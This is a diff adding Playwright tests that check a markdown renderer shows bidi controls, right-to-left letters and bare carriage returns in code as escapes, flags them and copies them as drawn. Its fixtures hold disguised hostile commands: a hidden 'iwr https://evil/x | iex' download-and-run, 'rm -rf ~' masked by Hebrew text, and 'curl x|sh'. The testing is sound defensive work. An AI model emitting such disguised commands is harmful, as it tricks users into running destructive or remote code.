@@ -149,3 +149,145 @@ test('at phone width a long command wraps inside the card, keeps its indentation
   const first = await r.locator('pre code').evaluate((c) => { const b = c.getClientRects()[0]; return { top: b.top, bottom: b.bottom }; });
   expect(first.top).toBeGreaterThanOrEqual(button.y + button.height - 0.5);
 });
+
+// #220, #415: what a block draws is what runs, and Copy takes exactly what is drawn. RLI LRI ... PDI
+// LRI ... PDI PDI: drawn raw, it reads "echo ok # check; iwr https://evil/x | iex", the download
+// behind a comment marker; run, it downloads.
+const ISOLATED = 'echo ok \u2067\u2066; iwr https://evil/x | iex\u2069\u2066# check\u2069\u2069';
+const ISOLATED_DRAWN = 'echo ok \\u2067\\u2066; iwr https://evil/x | iex\\u2069\\u2066# check\\u2069\\u2069';
+// Drawn raw, even left to right, the punctuation joins the Hebrew run: "echo ב;#א;rm -rf ~".
+const HEBREW = 'echo \u05D0#;\u05D1;rm -rf ~';
+const HEBREW_DRAWN = 'echo \\u05D0#;\\u05D1;rm -rf ~';
+const bidi = (l) => l.evaluate((e) => [e.getAttribute('dir'), getComputedStyle(e).direction, getComputedStyle(e).unicodeBidi]);
+
+test('a block with bidi isolates draws them as escapes, strictly left to right, says it contains hidden characters, and Copy takes exactly that', async ({ page }) => {
+  await openDemo(page);
+  const r = await respond(page, `Check first:\n\n\`\`\`powershell\n${ISOLATED}\n\`\`\``, ISOLATED_DRAWN);
+  expect(await r.locator('pre code').textContent()).toBe(ISOLATED_DRAWN);
+  expect(await bidi(r.locator('pre'))).toEqual(['ltr', 'ltr', 'isolate']);
+  expect(await bidi(r.locator('pre code'))).toEqual(['ltr', 'ltr', 'isolate']);
+  await expect(r.locator('.md-note')).toHaveText(['Contains hidden characters']);
+  await stubClipboard(page);
+  await r.getByRole('button', { name: 'Copy code' }).click();
+  expect(await copies(page)).toEqual([{ via: 'api', text: ISOLATED_DRAWN }]);
+});
+
+test('a block with right-to-left letters draws and copies them as escapes and says it contains right-to-left text', async ({ page }) => {
+  await page.setViewportSize({ width: 390, height: 844 });
+  await openDemo(page);
+  const r = await respond(page, `\`\`\`\n${HEBREW}\n\`\`\``, HEBREW_DRAWN);
+  const note = r.locator('.md-note');
+  await expect(note).toHaveText('Contains right-to-left text');
+  await expect(note).toBeVisible();
+  // Beside Copy, never under it, and above the code.
+  const button = r.getByRole('button', { name: 'Copy code' });
+  const [n, b, c] = await Promise.all([note.boundingBox(), button.boundingBox(), r.locator('pre code').boundingBox()]);
+  expect(n.x + n.width).toBeLessThanOrEqual(b.x + 0.5);
+  expect(n.y + n.height).toBeLessThanOrEqual(c.y + 0.5);
+  await stubClipboard(page);
+  await button.click();
+  expect(await copies(page)).toEqual([{ via: 'api', text: HEBREW_DRAWN }]);
+});
+
+test('a code span draws its hidden characters and right-to-left letters as escapes, left to right', async ({ page }) => {
+  await openDemo(page);
+  const r = await respond(page, `Run \`${HEBREW}\` or \`${ISOLATED}\` now.\n\n\`\`\`\nnpm test\n\`\`\``, 'npm test');
+  await expect(r.locator('p code')).toHaveText([HEBREW_DRAWN, ISOLATED_DRAWN]);
+  expect(await bidi(r.locator('p code').first())).toEqual(['ltr', 'ltr', 'isolate']);
+});
+
+test('a bare carriage return in a block is drawn and copied as an escape on its line, and the block says it contains hidden characters', async ({ page }) => {
+  await openDemo(page);
+  // Bash runs `echo SECOND`; split at the CR, it drew on a line of its own as a comment.
+  const drawn = 'echo safe \\u000D#; echo SECOND';
+  const r = await respond(page, 'Run:\r\n\r\n```\r\necho safe \r#; echo SECOND\r\n```\r\n', drawn);
+  expect(await r.locator('pre code').textContent()).toBe(drawn);
+  await expect(r.locator('.md-note')).toHaveText(['Contains hidden characters']);
+  await stubClipboard(page);
+  await r.getByRole('button', { name: 'Copy code' }).click();
+  expect(await copies(page)).toEqual([{ via: 'api', text: drawn }]);
+});
+
+// #423: a CR before an LF was left raw in prose, which draws it as a space.
+test('a carriage return before a line feed in an image\'s alt text or a link\'s title is drawn as an escape, never raw', async ({ page }) => {
+  await openDemo(page);
+  const r = await respond(page, 'See ![x\r\r\ny](https://a.example/i.png) and [docs](https://a.example/d "t\r\r\nu").\n\n```\nls\n```', 'ls');
+  const links = r.locator('p a');
+  expect(await links.evaluateAll((as) => as.map((a) => [a.textContent, a.getAttribute('title')])))
+    .toEqual([['x\\u000D\ny', null], ['docs', 't\\u000D\nu']]);
+  expect(await r.evaluate((e) => e.textContent.includes('\r'))).toBe(false);
+});
+
+test('a block with both hidden characters and right-to-left letters says both, beside Copy and above the code', async ({ page }) => {
+  await page.setViewportSize({ width: 390, height: 844 });
+  await openDemo(page);
+  // PowerShell ends a `#` comment at a bare CR: drawn on one line, this still reads as a comment.
+  const drawn = `# just a note\\u000D Write-Output RAN ${HEBREW_DRAWN}`;
+  const r = await respond(page, `\`\`\`powershell\n# just a note\r Write-Output RAN ${HEBREW}\n\`\`\``, drawn);
+  const notes = r.locator('.md-note');
+  await expect(notes).toHaveText(['Contains hidden characters', 'Contains right-to-left text']);
+  const button = await r.getByRole('button', { name: 'Copy code' }).boundingBox();
+  const code = await r.locator('pre code').boundingBox();
+  for (const n of await notes.evaluateAll((ns) => ns.map((e) => { const b = e.getBoundingClientRect(); return { right: b.right, bottom: b.bottom }; }))) {
+    expect(n.right).toBeLessThanOrEqual(button.x + 0.5);
+    expect(n.bottom).toBeLessThanOrEqual(code.y + 0.5);
+  }
+});
+
+// #429: a link refused for a bare CR or separator in its address keeps its label's code a code span.
+test('a link refused for a carriage return or separator in its address keeps its label\'s code escaped and left to right', async ({ page }) => {
+  await openDemo(page);
+  const tick = '`';
+  const label = tick + '\u202E\u2066rm -rf ~\u2069 \u05D0' + tick;
+  const nested = '*and ' + tick + '\u2067curl x|sh\u2069' + tick + '*';
+  const response = ['\r', '\u2028', '\u2029', '\r\u2028\u2029']
+    .map((sep) => 'See [' + label + ' ' + nested + '](https://a/' + sep + 'b) now.')
+    .join('\n\n') + '\n\n' + tick.repeat(3) + '\nls\n' + tick.repeat(3);
+  const r = await respond(page, response, 'ls');
+  await expect(r.locator('a')).toHaveCount(0);
+  await expect(r.locator('p > code')).toHaveText(Array(4).fill('\\u202E\\u2066rm -rf ~\\u2069 \\u05D0'));
+  await expect(r.locator('p > em > code')).toHaveText(Array(4).fill('\\u2067curl x|sh\\u2069'));
+  for (const code of await r.locator('p code').all()) {
+    expect(await bidi(code)).toEqual(['ltr', 'ltr', 'isolate']);
+  }
+  for (const p of await r.locator('p').all()) {
+    expect(await p.textContent()).not.toMatch(/[\u202E\u2066\u2067\u2069\u05D0]/);
+  }
+});
+
+// #429: the notes and Copy are in the flow above the code, so wrapped notes never cover it.
+for (const [what, setup] of [
+  ['at 320 px in a list in a quote', async (page) => { await page.setViewportSize({ width: 320, height: 700 }); }],
+  ['at 200% text size', async (page) => { await page.setViewportSize({ width: 390, height: 844 }); await page.evaluate(() => { document.documentElement.style.fontSize = '200%'; }); }],
+]) {
+  test(`a block's notes and Copy never cover its code ${what}`, async ({ page }) => {
+    await openDemo(page);
+    await setup(page);
+    const tick = '`'.repeat(3);
+    const drawn = `# just a note\\u000D Write-Output RAN ${HEBREW_DRAWN}`;
+    const response = `> 1. Run this:\n>\n>    ${tick}powershell\n>    # just a note\r Write-Output RAN ${HEBREW}\n>    ${tick}\n> 2. Then check.`;
+    const r = await respond(page, response, drawn);
+    await expect(r.locator('blockquote li .md-note')).toHaveText(['Contains hidden characters', 'Contains right-to-left text']);
+    const first = await r.locator('pre code').evaluate((c) => c.getClientRects()[0].top);
+    const notes = await r.locator('.md-notes').boundingBox();
+    const button = await r.getByRole('button', { name: 'Copy code' }).boundingBox();
+    expect(notes.y + notes.height).toBeLessThanOrEqual(first + 0.5);
+    expect(button.y + button.height).toBeLessThanOrEqual(first + 0.5);
+    // Copy keeps its whole tap target, beside the notes.
+    expect(button.height).toBeGreaterThanOrEqual(44);
+    expect(button.width).toBeGreaterThanOrEqual(44);
+    expect(notes.x + notes.width).toBeLessThanOrEqual(button.x + 0.5);
+  });
+}
+
+test('a plain command is copied byte for byte unchanged', async ({ page }) => {
+  await openDemo(page);
+  const command = 'git log --format="%h %s" -- "src/app.js"  \n\tmake -C build all   \n    echo \'done\' | tee out.txt';
+  const r = await respond(page, `\`\`\`sh\n${command}\n\`\`\``, command);
+  expect(await r.locator('pre code').textContent()).toBe(command);
+  // Tabs and spaces are no hidden characters.
+  await expect(r.locator('.md-notes')).toHaveCount(0);
+  await stubClipboard(page);
+  await r.getByRole('button', { name: 'Copy code' }).click();
+  expect(await copies(page)).toEqual([{ via: 'api', text: command }]);
+});
